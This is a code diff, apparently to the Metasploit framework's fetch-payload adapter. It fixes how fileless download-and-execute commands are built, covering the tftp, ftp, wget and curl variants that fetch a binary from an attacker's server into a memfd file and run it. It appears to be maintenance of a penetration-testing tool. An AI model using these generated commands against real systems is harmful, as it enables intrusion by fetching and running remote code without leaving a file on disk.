@@ -103,7 +103,7 @@ module Msf::Payload::Adapter::Fetch
       return datastore['FETCH_FILELESS'] && !windows? ? _generate_curl_command_fileless : _generate_curl_command
     when 'TFTP'
       return datastore['FETCH_FILELESS'] && !windows? ? _generate_tftp_command_fileless : _generate_tftp_command
-    # ignoring certutil
+    # ignoring certutil when FETCH_FILELESS is enabled
     when 'CERTUTIL'
       return _generate_certutil_command
     else
@@ -246,7 +246,7 @@ module Msf::Payload::Adapter::Fetch
     # and execute it
     cmd << '; then while read f'
     cmd << '; do if [[ $(ls -al $f | grep -o memfd | wc -l) == 1 ]]'
-    cmd << "; then #{get_file_cmd} $f"
+    cmd << "; then #{get_file_cmd}"
     cmd << '; $f'
     cmd << '; FOUND=1'
     cmd << '; break'
@@ -283,7 +283,7 @@ module Msf::Payload::Adapter::Fetch
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
-    _generate_fileless(fetch_command)
+    _generate_fileless(fetch_command + ' $f')
   end
 
   def _generate_ftp_command
@@ -299,7 +299,7 @@ module Msf::Payload::Adapter::Fetch
     end
   end
 
-  def _generate_ftp_command_filess
+  def _generate_ftp_command_fileless
     case fetch_protocol
     when 'FTP'
       fetch_command = "ftp ftp://#{download_uri} -Vo"
@@ -310,7 +310,7 @@ module Msf::Payload::Adapter::Fetch
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
-    _generate_fileless(fetch_command)
+    _generate_fileless(fetch_command + ' $f')
   end
 
   def _generate_tftp_command
@@ -334,11 +334,11 @@ module Msf::Payload::Adapter::Fetch
     case fetch_protocol
     when 'TFTP'
       _check_tftp_file
-      cmd = "(echo binary ; echo get #{srvuri} ) | tftp #{srvhost}; chmod +x ./#{srvuri}; ./#{srvuri} &"
+      fetch_command = "(echo binary ; echo get #{srvuri} $f ) | tftp #{srvhost}"
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
-    cmd
+    _generate_fileless(fetch_command)
   end
 
   def _generate_tnftp_command
@@ -365,7 +365,7 @@ module Msf::Payload::Adapter::Fetch
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
-    _generate_fileless(fetch_command)
+    _generate_fileless(fetch_command + ' $f')
   end
 
   def _generate_wget_command
@@ -389,7 +389,7 @@ module Msf::Payload::Adapter::Fetch
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
-    _generate_fileless(fetch_command)
+    _generate_fileless(fetch_command + ' $f')
   end
 
   def _remote_destination
